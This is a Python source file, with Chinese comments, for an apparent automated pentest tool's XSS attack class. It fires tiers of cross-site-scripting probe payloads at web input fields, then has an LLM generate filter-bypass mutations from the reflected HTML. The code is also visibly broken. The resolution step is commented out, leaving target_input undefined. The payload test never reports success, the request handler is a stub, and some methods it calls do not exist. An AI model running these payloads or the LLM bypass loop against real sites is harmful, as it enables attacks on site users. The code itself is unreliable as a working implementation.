# 导入必要的类型和结构
import uuid
from typing import Dict, Any, List, Optional

from analysis.owasp_llm_analyzer import PotentialIssue
from attacker.attack_target import AttackResult
from attacker.payload.a03_xss_payload import XSSPayloadLib
from scanner.page_asset import InputField, SiteAsset
from attacker.attack_strategy import AttackStrategy


# 确保您可以访问 Playwright 或 HTTP 客户端
# from playwright.sync_api import Page
# from attack_tools import get_session_client # 假设这是一个获取客户端的函数

class XSSAttacker(AttackStrategy):
    """
    负责执行 XSS 攻击策略。
    主要流程：通用载荷测试 -> LLM分析过滤 -> LLM生成绕过载荷 -> 确认执行。
    """

    def __init__(self, llm_proxy: Any):
        """初始化，传入 LLM 代理。"""
        super().__init__(llm_proxy)

        # 基础 XSS 探测载荷
        self.basic_payloads: List[str] = [
            "<script>alert(1)</script>",  # 经典标签
            "\"'onload=prompt(1)>",  # 事件注入 (针对属性)
            "javascript:prompt(1)",  # 伪协议 (针对 href)
            "<svg/onload=prompt(1)>",  # 无需 <script> 标签
        ]

    def exploit(self, issue: PotentialIssue, site_asset: SiteAsset, session_context: Dict) -> AttackResult:
        """
        执行 XSS 攻击 (集成 4 梯队 Payload 策略)。
        """

        # # -------------------------------------------------------------
        # # 0. 目标解析 (Resolution) - 这一步必须保留，否则无法操作页面
        # # -------------------------------------------------------------
        # target_input: Optional[InputField] = None
        #
        # if issue.related_input_id is not None:
        #     target_input = self._find_input_by_id(site_asset, issue.related_input_id)
        #
        # if not target_input:
        #     # 如果找不到 Input，且没有 API URL，就没法打
        #     return AttackResult(
        #         success=False,
        #         vulnerability_type='XSS',
        #         severity="Info",
        #         proof_of_concept='',
        #         request_snapshot={},
        #         response_snapshot="",
        #         details=f"Target InputField (ID: {issue.related_input_id}) not found."
        #     )

        print(f"[*] Starting XSS attack on {issue.url}")

        # -------------------------------------------------------------
        # 1. 上下文推断 (Context Inference)
        # -------------------------------------------------------------
        # 简单的启发式逻辑：看 issue 的描述里有没有暗示 "attribute", "value", "href" 等
        # 如果不确定，默认为 'html'，但在 get_payloads('html') 里我们也包含了一些属性 payload 作为兜底
        context_type = "html"
        loc_str = (issue.location + issue.risk_reason).lower()

        if "attribute" in loc_str or "input value" in loc_str or "href" in loc_str:
            context_type = "attribute"

        print(f"[*] Inferred Context: {context_type}")

        # -------------------------------------------------------------
        # Phase 1: 静态 Payload 轰炸 (Tier 1, 2, 3)
        # -------------------------------------------------------------
        # 这里获取的是已经排序好的列表：Polyglots -> Modern -> Legacy
        static_payloads = XSSPayloadLib.get_payloads(context=context_type)

        print(f"[*] Testing {len(static_payloads)} static payloads (Tiers 1-3)...")

        for payload in static_payloads:
            # _test_payload 内部负责：填入输入 -> 提交 -> 监听弹窗/检查回显
            if self._test_payload(target_input, payload, session_context):
                return AttackResult(
                    success=True,
                    vulnerability_type='XSS',
                    severity="High",  # 弹窗成功就是 High
                    proof_of_concept=payload,
                    request_snapshot={},  # 需在 _test_payload 里捕获
                    response_snapshot="",
                    details=f"Success with static payload ({context_type} context)."
                )

        # -------------------------------------------------------------
        # Phase 2: LLM 智能绕过 (Tier 4)
        # -------------------------------------------------------------
        print("[*] Static payloads failed. Engaging LLM for mutation analysis (Tier 4)...")

        # 1. 指纹探测 (Fingerprinting)
        # 发送一个包含特殊字符的探测包，看看谁被过滤了
        fingerprint_payload = "<script/xss_test>alert(1);\"'</script>"
        response_data, response_html = self._send_and_capture_response(
            target_input, fingerprint_payload, session_context
        )

        if not response_data:
            return AttackResult(
                success=False,
                vulnerability_type='XSS',
                severity="Info",
                proof_of_concept='',
                request_snapshot={},
                response_snapshot="",
                details="Failed to get valid response for analysis."
            )

        # 2. 准备 LLM 上下文
        print("[*] Consulting LLM to generate custom bypass payloads...")

        llm_context = {
            "target_url": target_input.page_url,
            "target_field_name": target_input.name,
            "field_selector": target_input.css_selector,
            "reflected_response_html": response_html,  # 让 LLM 看到过滤后的样子
            "failed_payload": fingerprint_payload,

            # [关键]：传入 Analysis 阶段的洞察
            "risk_analysis": issue.risk_reason,
            "analyzer_suggestions": issue.suggested_tests,

            # [关键]：传入 Tier 4 变异策略知识库
            "available_mutation_strategies": XSSPayloadLib.get_mutation_strategies()
        }

        # 3. LLM 生成 Payload
        # 这里假设 self.utils.generate_xss_bypass 会利用上面的 strategies 生成变异体
        llm_generated_payloads: List[str] = self.llm.generate_xss_bypass(llm_context)
        print(f"[*] LLM generated {len(llm_generated_payloads)} mutation payloads.")

        # 4. 测试 LLM 生成的载荷
        for payload in llm_generated_payloads:
            if self._test_payload(target_input, payload, session_context):
                return AttackResult(
                    success=True,
                    vulnerability_type='XSS',
                    severity="High",
                    proof_of_concept=payload,
                    request_snapshot={},
                    response_snapshot="",
                    details="XSS successfully bypassed filters using LLM-generated payload."
                )

        # -------------------------------------------------------------
        # Phase 3: 最终失败
        # -------------------------------------------------------------
        return AttackResult(
            success=False,
            vulnerability_type='XSS',
            severity="Low",
            proof_of_concept='',
            request_snapshot={},
            response_snapshot="",
            details="All XSS attempts failed, including Tier 1-4 strategies."
        )

    def _send_and_capture_response(self, target: InputField, payload: str, context: Dict) -> tuple[
        Optional[Dict], Optional[str]]:
        """
        发送载荷，返回请求和响应数据。
        这部分逻辑需要依赖 Playwright/Requests 客户端，它应该从 session_context 中获取。
        """
        # 假设 context['client'] 是 Playwright Page 或 Requests Session
        # client = context.get('client')
        # if not client: return None, None

        # 1. 构造请求：将载荷注入到目标字段
        # ... (根据 target.page_url, target.name, target.css_selector 构造请求)

        # 2. 发送请求并获取响应
        # response = client.request(method='GET/POST', url=target.page_url, data/params={target.name: payload})

        # 3. 提取核心数据
        response_data = {"status": 200, "headers": {}, "body_snapshot": "..."}  # 假设提取了部分数据
        response_html = "<html>...反射载荷后的HTML...</html>"  # 假设这是渲染后的HTML

        return response_data, response_html

    def _test_payload(self, target: InputField, payload: str, context: Dict) -> bool:
        """
        发送载荷，并检查 XSS 是否被成功执行。

        这是 XSS 攻击中最难的自动化部分，需要确认载荷是否：
        1. 成功反射到 DOM 中 (反射型/存储型)
        2. 被浏览器解析并执行 (DOM XSS/其他)
        """
        response_data, response_html = self._send_and_capture_response(target, payload, context)

        if not response_html:
            return

    def get_prioritized_payloads(self, context_type: str) -> List[str]:
        payloads = []

        # 1. 先来几个 Polyglots，试图乱拳打死老师傅
        payloads.extend(self.load_polyglots())

        # 2. 根据上下文加载现代 Payload (命中率最高)
        if context_type == "html":
            payloads.extend(self.load_modern_tags())
        elif context_type == "attribute":
            payloads.extend(self.load_attribute_breakers())

        # 3. 最后加载 Legacy Payloads (包括 iframe javascript 伪协议)
        # 用来检测服务端的过滤底线
        payloads.extend(self.load_legacy_payloads())

        return payloads

    def detect_reflection(self, target_input, session_context):
        """
        探测回显逻辑：
        1. 发送包含特殊字符的随机 Token
        2. 检查响应中是否存在该 Token
        3. 检查 Token 是否被转义
        """
        # 1. 生成金丝雀 (Canary)
        # 包含 XSS 必须的特殊字符：单引号、双引号、尖括号
        canary_token = f"pt_{uuid.uuid4().hex[:6]}"
        probe_payload = f"{canary_token}<'\""

        # 2. 发送请求
        # 这里复用你之前的 _send_and_capture_response
        response_data, response_html = self._send_and_capture_response(
            target_input, probe_payload, session_context
        )

        if not response_html:
            return None

        # 3. 检查回显
        if canary_token not in response_html:
            # 根本没回显，直接 Pass，省下了调用 LLM 的钱
            print(f"[-] No reflection found for {target_input.name}")
            return None

        # 4. 检查转义情况 (简单判断)
        is_vulnerable = False
        context = "unknown"

        # 检查是否原样返回了特殊字符
        if f"{canary_token}<'\"" in response_html:
            is_vulnerable = True
            print(f"[+] Found RAW reflection! Vulnerable candidate.")
        elif f"{canary_token}&lt;" in response_html:
            print(f"[-] Reflection found but HTML encoded (Safe).")
            # 除非你有专门绕过编码的手段，否则通常认为安全
            return None

            # 5. 简单确定上下文 (Python 粗略判断，LLM 精细判断)
        # 找到 token 在 html 中的位置索引
        idx = response_html.find(canary_token)
        # 取 token 前面 20 个字符看看
        prefix = response_html[max(0, idx - 20):idx]

        if '="' in prefix or "='" in prefix:
            context = "attribute"
        elif '<script' in prefix:
            context = "script"
        else:
            context = "html"

        return {
            "is_vulnerable": is_vulnerable,
            "context": context,
            "reflection_snippet": response_html[max(0, idx - 50):idx + 50]  # 截取一段给 LLM 看
        }